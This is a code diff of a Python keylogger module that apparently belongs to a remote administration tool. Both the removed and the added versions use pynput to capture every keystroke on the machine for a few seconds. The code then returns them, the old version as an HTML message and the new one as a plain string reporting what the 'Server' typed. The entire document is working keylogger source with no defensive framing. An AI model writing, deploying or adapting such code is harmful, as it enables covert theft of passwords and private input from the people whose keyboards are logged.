@@ -1,68 +1,33 @@
-import datetime
-from pynput import keyboard
+import logging
+import os
 import time
-
-import htmlgenerator as ht
-
-spec_key = {
-    key: f'⌠{key}⌡'
-    for key in [
-        'ctrl', 'shift', 'tab',
-        'esc', 'left windows', 'print screen',
-        'end', 'delete', 'f1', 'f2', 'f3', 'f4',
-        'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
-        'insert', 'down', 'page down',
-        'right', 'clear', 'left',
-        'home', 'up', 'num lock',
-        'backspace', 'enter', 'right shift',
-        'page up', 'space', 'alt',
-        'caps lock', 'right alt', 'right ctrl',
-    ]
-}
-
-spec_key['space'] = ' '
-
-logger = []
+import threading
+from pynput.keyboard import Listener
 
 
-def on_press(key):
-    try:
-        if key.char:
-            res = key.char
-        else:
-            res = str(key)
-            res = spec_key.get(res, res)
-        logger.append(res)
-    except AttributeError:
-        res = str(key)
-        res = spec_key.get(res, res)
-        logger.append(res)
+def key_logger(default_value=None):
+    global listener
+    global key_string
 
+    key_string = ""
 
-def __key_log(duration):
-    global logger
-    logger = []
+    def on_press(key):
+        global key_string
+        try:
+            key_string += str(key) + " "
+            logging.info(key)
+        except AttributeError:
+            key_string += str(key)
+            logging.error(key)
 
-    listener = keyboard.Listener(on_press=on_press)
-    listener.start()
+    with Listener(on_press=on_press) as listener:
+        listener_thread = threading.Thread(target=listener.join)
+        listener_thread.start()
+        # listen for ten seconds
+        time.sleep(10)
+        listener.stop()
 
-    time.sleep(duration)
-    listener.stop()
-
-    _time = datetime.datetime.now()
-    content = f'{duration} seconds of key logging (from: {_time}): <span style="font-weight: bold;">' + ''.join(
-        logger) + '</span>'
-
-    return content
-
-
-def get_key_log(duration=5):
-    duration = int(duration)
-    content = __key_log(duration)
-
-    response = {
-        'html': ht.html_msg(content, status=None, bold_all=False),
-        'data': None
-    }
-
-    return response
+    if key_string != "":
+        return "Key Logger: \n" + key_string
+    else:
+        return "Key Logger: Server did not input anything!"
